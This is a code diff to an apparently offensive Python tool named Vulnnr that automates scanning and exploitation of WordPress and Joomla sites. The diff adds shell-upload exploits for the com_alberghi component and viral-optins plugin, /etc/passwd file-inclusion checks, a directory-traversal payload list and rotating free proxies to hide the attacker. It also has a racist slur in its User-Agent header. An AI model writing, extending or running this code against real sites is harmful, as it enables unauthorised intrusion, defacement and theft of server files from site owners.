@@ -1,10 +1,12 @@
 import os, requests, colorama, socket, getpass, subprocess, json, time, re, datetime, random, threading, io, multiprocessing
-import urllib3
+import urllib3, sys
 from Exploits.com_bjcontact import bj
 from Exploits.CVE202126723 import Jenzabar
 from Exploits.Hrsale import *
 from modules.search import dorker
 from Exploits.CVE202011731 import Media
+from bs4 import BeautifulSoup
+from Exploits.eCommerce import eCommerce
 from Exploits.asistorage import asistorage
 from modules.dirscan import dirscan
 import Exploits.colors
@@ -25,7 +27,8 @@ CYAN = Fore.CYAN
 now = datetime.datetime.now()
 year = now.strftime('%Y')
 month = now.strftime('%m')
-Version = "v1.0"
+site = "www.fedsearch.xyz"
+Version = "1.2.1"
 timeout = 5
 HEADERS = {
     'User-Agent': 'NiggerPenis-WIN!10',
@@ -53,8 +56,9 @@ def banner():
      {GREEN},_,{PURPLE}        .       .   .   
     {GREEN}(O,O){PURPLE}        \     /    |  
     {GREEN}(   ){PURPLE}         \   /.  . | .--. .--. .--. {RED} ~ {RESET}Creator: {GREEN}Nano{PURPLE}
-    {RESET}-{GREEN}"-"{RESET}----{PURPLE}       \ / |  | | |  | |  | |    {RED} ~ {RESET}Version: {GREEN}{Version}{PURPLE}
-                    '  `--`-`-'  `-'  `-'  
+    {RESET}-{GREEN}"-"{RESET}----{PURPLE}       \ / |  | | |  | |  | |    {RED} ~ {RESET}Version: {GREEN}v{Version}{PURPLE}
+                    '  `--`-`-'  `-'  `-'    {RED} ~ {RESET}Website: {GREEN}{site}{PURPLE}\n
+                  {RESET}try {YELLOW}help {RESET}for more options
     
     """)
 
@@ -62,6 +66,22 @@ def banner():
 
  
 banner()
+
+
+def autoupdate():
+    print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Checking for updates...")
+    test = requests.get("https://raw.githubusercontent.com/X-x-X-0/Vulnnr/main/checks.txt")
+    time.sleep(3)
+    if Version in test.text:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}looks like u are using Vulnnr v{Version} upto date!")
+        time.sleep(4)
+        os.system('cls;clear')
+        banner()
+    else:
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}looks like u are using Vulnnr v{Version}, sadly that is currently out of date please update repo!")
+        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {GREEN}https://github.com/X-x-X-0/Vulnnr.git")
+        sys.exit()
+autoupdate()
 
 dirs = [
     '/wp-content/wpclone-temp/wpclone_backup/',
@@ -152,6 +172,51 @@ def config(url, path):
         #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
         return
 
+def com_alberghi(url):
+    Jce_Deface_image = "shell/hatelife.gif"
+    fileDeface = {'userfile': open(Jce_Deface_image, 'rb')}
+    Exp = url + '/administrator/components/com_alberghi/upload.alberghi.php'
+    Check = requests.get(Exp, timeout=10)
+    if 'class="inputbox" name="userfile"' in str(Check.content):
+        Post = requests.post(Exp, files=fileDeface, timeout=10)
+        if 'has been successfully' or 'already exists' in str(Post.content):
+            CheckIndex = requests.get(site + '/administrator/components/com_alberghi/' + Jce_Deface_image.split('/')[1], timeout=10)
+            if 'GIF89a' in str(CheckIndex.content):
+                filename = "Results/shells.txt"
+                with open(filename, "a+") as f:
+                    f.write(url + '/administrator/components/com_alberghi/' + Jce_Deface_image.split('/')[1] + '\n')
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}com_alberghi Exploit {PURPLE}=> {GREEN}Vuln{RESET} shell saved to {filename}")
+        else:
+            print(f"{PURPLE} [ {GREEN}! {PURPLE}] {RESET}com_alberghi {PURPLE}=> {RED}Not Vuln ")
+        
+
+        
+def fileup(url):
+    
+    defaceFile = {'Filedata': (
+                      'VuLLnr.txt', open('shell/vuln.txt', 'rb'), 'text/html')
+           }
+    x = requests.post(url + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', files=defaceFile, timeout=5)
+    if 'id="wpvimgres"' in x.text:
+        uploader = url + '/wp-content/uploads/' + year + '/' + month + '/VuLLnr.txt'
+        GoT = requests.get(uploader, timeout=5)
+        find = re.findall('<img src="http://(.*)" height="', x.text)
+        GoT2 = requests.get('http://' + find[0], timeout=5)
+        if 'Vulnnr on top' in GoT.text:
+            filename = "Results/shells.txt"
+            with open(filename, "a+") as f:
+                f.write(uploader + '\n')
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}viral-optins Exploit {PURPLE}=> {GREEN}Vuln{RESET} shell saved to {filename}")
+        else:
+            if 'Vulnnr on top' in GoT2.text:
+                filename = "Results/shells.txt"
+                with open(filename, "a+") as f:
+                    f.write(uploader + '\n')
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}viral-optins Exploit {PURPLE}=> {GREEN}Vuln{RESET} shell saved to {filename}")
+    else:
+        print(f"{PURPLE} [ {GREEN}! {PURPLE}] {RESET}viral-optins {PURPLE}=> {RED}Not Vuln ")
+
+    
 
 
 
@@ -368,7 +433,7 @@ def tutor(url):
     test = requests.get(url+"/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd")
     if test.status_code == 200:
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
-        if "root" in test.text:
+        if "root:x" in test.text:
             with open(filename, "a+") as f:
                 f.write(f"EXPLOIT: {test.url}\n\n")
                 f.write(test.text)
@@ -536,7 +601,7 @@ def audioplayer(url):
     test = requests.get(url+"/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd")
     if test.status_code == 200:
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
-        if "root" in text.text:
+        if "root:x" in text.text:
             with open(filename, "a+") as f:
                 f.write(f"EXPLOIT: {test.url}\n\n")
                 f.write(test.text)
@@ -687,7 +752,7 @@ def spritz(url):
     test = requests.get(url+"wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd", timeout=timeout)
     if test.status_code == 200:
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
-        if "root" in test.text:
+        if "root:x" in test.text:
             with open(filename, "a+") as f:
                 f.write(f"EXPLOIT: {test.url}\n\n")
                 f.write(test.text)
@@ -745,19 +810,20 @@ def revslidercss(url):
 
 
 def mailman():
-    os.system("cls;clear")
+   
     banner()
-    user = input(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Site {PURPLE} =>{RESET} ")
+    print(f"{PURPLE} [ {GREEN}! {PURPLE}] {YELLOW}Method only works on pc/cmd sowwy adding linux support later")
+    user = input(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Target {PURPLE} =>{RESET} ")
     try:
         cpanelcheck = requests.get(f"{user}/cpanel")
         init_time = time.time()
         if cpanelcheck.status_code == 200:
             pass
         else:
-            print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RED}Error {PURPLE}=> {RESET}FDoes not Have a Cpanel Redirect")
+            print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RED}Error {PURPLE}=> {RESET}{user} Does not Have a Cpanel Redirect")
             return main()
     except:
-        os.system("cls;clear")
+        
         banner()
         return main()
     try:
@@ -783,10 +849,12 @@ def mailman():
             return main()
         
         print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend Info{PURPLE} => {RESET}\n" + dns.replace(",", '\n').replace('"', '',).replace('{', '').replace('}', '').replace(':', ': '))
+        
 
     #print(dns)
     except Exception as e:
-        os.system("cls;clear")
+        #os.system("cls;clear")
+        print(e)
         banner()
         return main()
 
@@ -961,7 +1029,7 @@ def auto(url):
         return main()
 
     try:
-        print(f"\n {PURPLE}[ {GREEN}~ {RESET} Looking for Serverinfo {GREEN}~{RESET} {PURPLE}]{RESET}\n")
+        print(f"\n {PURPLE}[ {GREEN}~ {RESET} Looking for Serverinfo {GREEN}~{RESET} {PURPLE}]{RESET}")
         
         cms = serialize(url)
         print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {GREEN}{url}")
@@ -985,8 +1053,10 @@ def auto(url):
             print("")
             Exploit(url)
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting vulnscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
+            fileup(url)
             #wp_thumbnailSlider(url) Broken
             revslidercss(url)
+            eCommerce(url)
             Media(url)
             Spreedsheet(url)
             wp_blaze(url)
@@ -1018,6 +1088,7 @@ def auto(url):
             com_portfolio(url)
             com_jck(url)
             Triconsole(url)
+            com_alberghi(url)
             bj(url)
 
         else:
@@ -1033,7 +1104,36 @@ def auto(url):
         print(e) 
         print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
         return
-        
+
+sqlerrors = {'MySQL': 'error in your SQL syntax',
+             'MiscError': 'mysql_fetch',
+             'MiscError2': 'num_rows',
+             'Oracle': 'ORA-01756',
+             'JDBC_CFM': 'Error Executing Database Query',
+             'JDBC_CFM2': 'SQLServer JDBC Driver',
+             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
+             'MSSQL_Uqm': 'Unclosed quotation mark',
+             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
+             'MS-Access_JETdb': 'Microsoft JET Database',
+             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
+             'Server Error' : 'Server Error',
+             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
+             'Invalid Querystring' : 'Invalid Querystring',
+             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
+             'VBScript Runtime' : 'VBScript Runtime',
+             'ADODB.Field' : 'ADODB.Field',
+             'BOF or EOF' : 'BOF or EOF',
+             'ADODB.Command' : 'ADODB.Command',
+             'JET Database' : 'JET Database',
+             'mysql_fetch_array()' : 'mysql_fetch_array()',
+             'Syntax error' : 'Syntax error',
+             'mysql_numrows()' : 'mysql_numrows()',
+             'GetArray()' : 'GetArray()',
+             'FetchRow()' : 'FetchRow()',
+             'Input string was not in a correct format' : 'Input string was not in a correct format',
+             'Not found' : 'Not found'}
+
+lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
 def com_cckjseblod(url):
     test = requests.get(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php", timeout=timeout, headers=HEADERS)
     if 'JConfig' in str(test.content):
@@ -1088,7 +1188,7 @@ def Com_civicrm(url):
 
 def Scriptegrator(url):
     test = requests.get(url+"/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd", headers=HEADERS, timeout=timeout)
-    if "root" in test.text:
+    if "root:x" in test.text:
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
         with open(filename, "a+") as f:
             f.write(test.text+ '\n')
@@ -1181,24 +1281,45 @@ def portcheck():
 
 
 
+def proxys():
+    try:
+        response = requests.get("https://sslproxies.org/")
+        soup = BeautifulSoup(response.content, 'html5lib')
+        proxy = {'https': choice(list(map(lambda x:x[0]+':'+x[1], list(zip(map(lambda x:x.text, 
+        soup.findAll('td')[::8]), map(lambda x:x.text, soup.findAll('td')[1::8]))))))}
+        return proxy
+    except Exception as e:
+        pass
+
+def domainscan():
+    proxy = proxys()
+    url = "https://fedsearch.xyz/"
+    phpver(url)
+
+    '''
+    learning about Domain scanning will work on this later when i hav finished 
+    '''
+        
+
+    
 
 def xhelp():
     print("")
     print(f"""
  {PURPLE}[ {GREEN}~ {PURPLE}] {RESET}webvulns:\n
-    {PURPLE}[ {GREEN}1 {PURPLE}] {RESET}mailman {PURPLE}=> {RESET}Cloudssp exploit
-    {PURPLE}[ {GREEN}2 {PURPLE}] {RESET}vulnscan {PURPLE}=> {RESET}Vuln Scanner/exploiter single target
-    {PURPLE}[ {GREEN}3 {PURPLE}] {RESET}vulnauto {PURPLE}=> {RESET}Vuln Scanner/exploiter list
-    {PURPLE}[ {GREEN}4 {PURPLE}] {RESET}wpversion {PURPLE}=> {RESET}Wordpress Version Scanner
-    {PURPLE}[ {GREEN}5 {PURPLE}] {RESET}wpthemes {PURPLE}=> {RESET}Wordpress Theme Scanner
-    {PURPLE}[ {GREEN}6 {PURPLE}] {RESET}wpplugins {PURPLE}=> {RESET}Wordpress Plugins Scanner
-    {PURPLE}[ {GREEN}7 {PURPLE}] {RESET}sql {PURPLE}=> {RESET}Sql injection Scanner
-    {PURPLE}[ {GREEN}8 {PURPLE}] {RESET}dorker {PURPLE}=> {RESET}Auto dorker Scanner/exploiter
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}mailman {PURPLE}=> {RESET}Cloudssp exploit
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}vulnscan {PURPLE}=> {RESET}Vuln Scanner/exploiter single target
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}vulnauto {PURPLE}=> {RESET}Vuln Scanner/exploiter list
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wpversion {PURPLE}=> {RESET}Wordpress Version Scanner
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wpthemes {PURPLE}=> {RESET}Wordpress Theme Scanner
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wpplugins {PURPLE}=> {RESET}Wordpress Plugins Scanner
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}sql {PURPLE}=> {RESET}Sql injection Scanner
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}dorker {PURPLE}=> {RESET}Auto dorker Scanner/exploiter
     
  {PURPLE}[ {GREEN}~ {PURPLE}] {RESET}others:\n
-    {PURPLE}[ {GREEN}1 {PURPLE}] {RESET}port {PURPLE}=> {RESET}Port Checker
-    {PURPLE}[ {GREEN}2 {PURPLE}] {RESET}domainscan {PURPLE}=> {RESET}Domain Scanner
-    {PURPLE}[ {GREEN}2 {PURPLE}] {RESET}dirscan {PURPLE}=> {RESET}dirs Scanner
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}port {PURPLE}=> {RESET}Port Checker
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}domainscan {PURPLE}=> {RESET}Domain Scanner
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}dirscan {PURPLE}=> {RESET}dirs Scanner
     """)
     return main()
 
@@ -1265,7 +1386,7 @@ def main():
 
     elif userinput == "vulnauto":
         print(f" \n {PURPLE}[ {GREEN}${PURPLE} ] {RESET}Vuln Scanner/Exploiter")
-        file_name = input(f" \n {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Targets {PURPLE}=>{RESET} ")
+        file_name = input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Targets {PURPLE}=>{RESET} ")
         try:
             
             with open(file_name, 'r') as f:
